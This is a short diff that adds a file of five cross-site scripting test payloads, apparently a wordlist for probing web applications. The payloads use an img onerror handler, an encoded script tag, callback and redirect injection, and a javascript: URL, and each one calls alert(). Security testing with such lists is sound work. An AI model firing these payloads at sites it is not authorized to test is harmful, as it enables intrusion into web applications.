@@ -1,0 +1,5 @@
+#fragment=<img src=x onerror=alert(1)>
+?input=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+?callback=alert(1)
+?redir=javascript:alert(1)
+#%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
